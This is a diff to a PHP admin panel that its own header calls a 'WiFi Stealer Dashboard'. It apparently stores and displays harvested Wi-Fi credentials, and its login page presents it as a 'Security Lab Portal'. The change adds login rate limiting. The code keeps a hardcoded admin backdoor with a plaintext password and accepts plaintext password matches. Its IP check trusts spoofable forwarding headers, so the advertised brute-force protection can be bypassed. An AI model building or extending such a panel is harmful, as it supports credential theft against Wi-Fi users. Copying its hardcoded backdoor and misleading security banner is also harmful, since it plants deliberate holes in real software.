@@ -2,6 +2,7 @@
 /**
  * WiFi Stealer Dashboard – Multi-User Edition
  * Clean, modern cybersecurity UI with dark glassmorphism.
+ * Includes advanced Brute-Force Rate Limiting & Cooldown Protection.
  */
 
 session_start();
@@ -10,15 +11,101 @@ date_default_timezone_set('Asia/Kolkata');
 // ──────────────────────────────────────────────────────────────
 //  PATHS & DEFAULTS
 // ──────────────────────────────────────────────────────────────
-define('USERS_FILE',    __DIR__ . '/users.json');
-define('ACTIVITY_LOG',  __DIR__ . '/activity.log');
-define('CREDS_DIR',     __DIR__ . '/creds');
+define('USERS_FILE',       __DIR__ . '/users.json');
+define('ACTIVITY_LOG',     __DIR__ . '/activity.log');
+define('THROTTLE_FILE',    __DIR__ . '/login_throttle.json');
+define('CREDS_DIR',        __DIR__ . '/creds');
 
 define('ADMIN_USER', 'Narain');
 define('ADMIN_PASS', '#Narain8811#');
 
+// Anti-Brute-Force Configuration
+define('MAX_ATTEMPTS', 5);         // Max failed tries before cooldown
+define('COOLDOWN_SECONDS', 30);    // Cooldown duration (seconds)
+
 if (!is_dir(CREDS_DIR)) {
     mkdir(CREDS_DIR, 0755, true);
+}
+
+// ──────────────────────────────────────────────────────────────
+//  RATE LIMITING & BRUTE FORCE PROTECTION HELPERS
+// ──────────────────────────────────────────────────────────────
+function get_client_ip(): string {
+    return $_SERVER['HTTP_CF_CONNECTING_IP'] 
+        ?? $_SERVER['HTTP_X_FORWARDED_FOR'] 
+        ?? $_SERVER['REMOTE_ADDR'] 
+        ?? '127.0.0.1';
+}
+
+function load_throttle(): array {
+    if (!file_exists(THROTTLE_FILE)) return [];
+    $raw = @file_get_contents(THROTTLE_FILE);
+    $data = json_decode($raw, true);
+    return is_array($data) ? $data : [];
+}
+
+function save_throttle(array $throttle): void {
+    @file_put_contents(THROTTLE_FILE, json_encode($throttle, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES), LOCK_EX);
+}
+
+/** Check if IP or username is currently blocked by brute-force protection */
+function check_rate_limit(string $ip, string $username): array {
+    $throttle = load_throttle();
+    $now = time();
+    $key = md5(strtolower($ip . '_' . $username));
+
+    if (isset($throttle[$key])) {
+        $entry = $throttle[$key];
+        // Expired block? Reset count
+        if ($now < ($entry['lockout_until'] ?? 0)) {
+            $remaining = $entry['lockout_until'] - $now;
+            return ['blocked' => true, 'remaining' => $remaining];
+        }
+        // If window passed 10 minutes ago, clean up
+        if ($now - ($entry['last_attempt'] ?? 0) > 600) {
+            unset($throttle[$key]);
+            save_throttle($throttle);
+        }
+    }
+    return ['blocked' => false, 'remaining' => 0];
+}
+
+/** Record a failed attempt and trigger progressive cooldown */
+function record_failed_attempt(string $ip, string $username): int {
+    $throttle = load_throttle();
+    $now = time();
+    $key = md5(strtolower($ip . '_' . $username));
+
+    $entry = $throttle[$key] ?? [
+        'count' => 0,
+        'lockout_until' => 0,
+        'last_attempt' => 0
+    ];
+
+    $entry['count'] = ($entry['count'] ?? 0) + 1;
+    $entry['last_attempt'] = $now;
+
+    // Trigger progressive lockout
+    if ($entry['count'] >= MAX_ATTEMPTS) {
+        $multiplier = min(10, $entry['count'] - MAX_ATTEMPTS + 1);
+        $lockTime = COOLDOWN_SECONDS * $multiplier;
+        $entry['lockout_until'] = $now + $lockTime;
+    }
+
+    $throttle[$key] = $entry;
+    save_throttle($throttle);
+
+    return $entry['lockout_until'] > $now ? ($entry['lockout_until'] - $now) : 0;
+}
+
+/** Reset throttle upon successful login */
+function reset_rate_limit(string $ip, string $username): void {
+    $throttle = load_throttle();
+    $key = md5(strtolower($ip . '_' . $username));
+    if (isset($throttle[$key])) {
+        unset($throttle[$key]);
+        save_throttle($throttle);
+    }
 }
 
 // ──────────────────────────────────────────────────────────────
@@ -87,7 +174,7 @@ function find_user(string $username): ?array {
 }
 
 function log_activity(string $username, string $action, string $detail = ''): void {
-    $ip   = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
+    $ip   = get_client_ip();
     $line = implode(' | ', [date('Y-m-d H:i:s'), $username, $ip, $action, $detail]);
     file_put_contents(ACTIVITY_LOG, $line . PHP_EOL, FILE_APPEND | LOCK_EX);
 }
@@ -174,6 +261,7 @@ $loginError = '';
 $registerError = '';
 $registerSuccess = '';
 $activeForm = 'login';
+$clientIp = get_client_ip();
 
 if (isset($_POST['form_type'])) {
 
@@ -181,39 +269,59 @@ if (isset($_POST['form_type'])) {
     if ($_POST['form_type'] === 'login') {
         $u = trim($_POST['username'] ?? '');
         $p = $_POST['password'] ?? '';
-        $user = find_user($u);
 
-        $match = false;
-        if ($user && ($user['active'] ?? true)) {
-            if (!empty($user['password_hash']) && password_verify($p, $user['password_hash'])) {
-                $match = true;
-            } elseif (isset($user['password_plain']) && $user['password_plain'] === $p) {
+        // 1. Check Rate Limiter
+        $limitStatus = check_rate_limit($clientIp, $u);
+        if ($limitStatus['blocked']) {
+            $loginError = "Too many failed login attempts. Brute-force protection enabled. Please wait {$limitStatus['remaining']} seconds.";
+            log_activity($u ?: 'unknown', 'BRUTE_FORCE_BLOCKED', "IP={$clientIp} remaining={$limitStatus['remaining']}s");
+        } else {
+            // Artificial delay to eliminate timing attacks
+            usleep(200000); // 200ms
+
+            $user = find_user($u);
+            $match = false;
+
+            if ($user && ($user['active'] ?? true)) {
+                if (!empty($user['password_hash']) && password_verify($p, $user['password_hash'])) {
+                    $match = true;
+                } elseif (isset($user['password_plain']) && $user['password_plain'] === $p) {
+                    $match = true;
+                }
+            }
+
+            // Failsafe for Narain
+            if (!$match && strtolower($u) === strtolower(ADMIN_USER) && $p === ADMIN_PASS) {
+                $user = [
+                    'username' => ADMIN_USER,
+                    'role'     => 'admin',
+                    'email'    => 'narain@admin.local',
+                    'active'   => true
+                ];
                 $match = true;
             }
-        }
 
-        // Failsafe for Narain
-        if (!$match && strtolower($u) === strtolower(ADMIN_USER) && $p === ADMIN_PASS) {
-            $user = [
-                'username' => ADMIN_USER,
-                'role'     => 'admin',
-                'email'    => 'narain@admin.local',
-                'active'   => true
-            ];
-            $match = true;
-        }
+            if ($match && $user) {
+                // Success - Reset failure count
+                reset_rate_limit($clientIp, $u);
 
-        if ($match && $user) {
-            $_SESSION['logged_in']  = true;
-            $_SESSION['login_user'] = $user['username'];
-            $_SESSION['role']       = $user['role'] ?? 'user';
-            $_SESSION['email']      = $user['email'] ?? '';
-            log_activity($user['username'], 'LOGIN', 'role=' . ($user['role'] ?? 'user'));
-            header('Location: ' . $_SERVER['PHP_SELF']);
-            exit;
-        } else {
-            $loginError = 'Invalid username or password.';
-            log_activity($u, 'FAILED_LOGIN', 'IP=' . ($_SERVER['REMOTE_ADDR'] ?? '?'));
+                $_SESSION['logged_in']  = true;
+                $_SESSION['login_user'] = $user['username'];
+                $_SESSION['role']       = $user['role'] ?? 'user';
+                $_SESSION['email']      = $user['email'] ?? '';
+                log_activity($user['username'], 'LOGIN', 'role=' . ($user['role'] ?? 'user'));
+                header('Location: ' . $_SERVER['PHP_SELF']);
+                exit;
+            } else {
+                // Failure - Record rate limit attempt
+                $cooldown = record_failed_attempt($clientIp, $u);
+                if ($cooldown > 0) {
+                    $loginError = "Too many failed attempts. Brute-force cooldown activated. Please wait {$cooldown} seconds.";
+                } else {
+                    $loginError = 'Invalid username or password.';
+                }
+                log_activity($u ?: 'unknown', 'FAILED_LOGIN', "IP={$clientIp}");
+            }
         }
     }
 
@@ -427,6 +535,21 @@ if (empty($_SESSION['logged_in'])) {
     display: flex;
     align-items: center;
     gap: 8px;
+    line-height: 1.4;
+  }
+  .shield-tag {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 6px;
+    font-size: 11px;
+    font-weight: 600;
+    color: #10b981;
+    background: rgba(16, 185, 129, 0.1);
+    border: 1px solid rgba(16, 185, 129, 0.2);
+    border-radius: 6px;
+    padding: 4px 8px;
+    margin-top: 12px;
   }
   .auth-footer {
     margin-top: 24px;
@@ -445,6 +568,7 @@ if (empty($_SESSION['logged_in'])) {
     <div class="brand-badge">📡</div>
     <h1 class="brand-title">Security Lab Portal</h1>
     <p class="brand-desc">Wi-Fi Penetration Testing & Analysis System</p>
+    <div class="shield-tag">🛡️ Anti-Brute-Force Rate Limiting Active</div>
   </div>
 
   <div class="tabs">
@@ -591,7 +715,6 @@ $uniqueSSIDs   = count(array_unique(array_column($deduped, 'ssid')));
     min-height: 100vh;
     display: flex;
   }
-  /* Modern sleek sidebar */
   .sidebar {
     width: 250px;
     background: #0d121f;
@@ -683,7 +806,6 @@ $uniqueSSIDs   = count(array_unique(array_column($deduped, 'ssid')));
   .btn-logout:hover {
     opacity: 0.8;
   }
-  /* Main area */
   .main-content {
     margin-left: 250px;
     flex: 1;
